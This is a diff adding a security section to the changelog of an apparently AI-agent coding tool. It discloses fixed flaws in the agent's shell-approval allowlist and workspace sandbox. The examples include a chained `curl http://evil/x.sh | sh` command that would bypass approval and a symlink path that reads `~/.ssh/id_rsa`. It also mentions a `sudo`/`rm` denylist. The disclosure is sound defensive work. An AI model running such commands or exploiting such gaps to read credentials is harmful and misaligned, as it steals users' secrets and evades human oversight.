@@ -47,6 +47,42 @@ end against a live vLLM 0.28 server (`nvidia/Qwen3.6-35B-A3B-NVFP4`).
   through the OpenAI chat-completions loop added in #551 — including tool
   calling, which vLLM implements natively.
 
+### Security
+- **"Always Allow" no longer hands over a shell (#606, #609).** Approving
+  `npm test` once stored the token `npm`, after which `npm test && curl
+  http://evil/x.sh | sh` ran with no prompt — and that modal is the only
+  boundary between the model and a shell, since the Rust side passes the whole
+  line to `sh -c` unfiltered. Approvals are now two separate scopes: the exact
+  command line by default, and program scope only via its own labelled button,
+  offered only for a plain command line. Program scope additionally fails
+  closed on any shell control character (a character-class scan, not a list of
+  scary words, which is trivially rewritten around). The bare `a` shortcut
+  grants only the narrowest scope and no longer fires from a text field or
+  with Shift held. The modal text now matches what is actually remembered — it
+  previously claimed "this exact command" for a control that did the opposite.
+  Browser approvals, which reuse the same modal, no longer write the junk
+  token `Browser` into the CLI allowlist.
+- **The agent can no longer read outside the workspace through a symlink
+  (#607).** The sandbox check normalised `..` lexically but never resolved
+  symlinks, while `std::fs` follows them: with a `link -> $HOME` in the
+  workspace, `read_file("link/.ssh/id_rsa")` passed the check and returned the
+  key — unprompted at every autonomy level, since `read_file` is read-only.
+  Such links occur routinely in cloned repos and node_modules link farms, so
+  no planted file was required. Paths are now canonicalised as far as they
+  exist (new files still resolve) and refused only when the target leaves
+  every root, so legitimate internal links keep working. The same fix removes
+  a class of false rejections where a path arriving through a symlinked
+  ancestor (macOS `/tmp` → `/private/tmp`) was wrongly refused.
+- **`requestCliApproval` fails closed.** It returned `true` when no approval
+  UI was registered; a gate whose absence means "allow" is the wrong default.
+  Tests opt in explicitly.
+- **Corrected the misleading Rust security docs.** `CLI_DENYLIST` (`sudo`,
+  `rm`, …) is unreachable from the UI, so a reader reasonably concluded those
+  commands were blocked for the agent. The comment now says plainly that it is
+  not a boundary, and why re-pointing `run_shell_command` at it is not
+  actionable (it spawns without a shell and cannot run the pipes and `&&` the
+  agentic loop depends on).
+
 ### Fixed
 - **Max tokens, stop sequences and top_p now reach OpenAI-compatible servers
   (#568).** An LM Studio or vLLM user could set max tokens and a stop
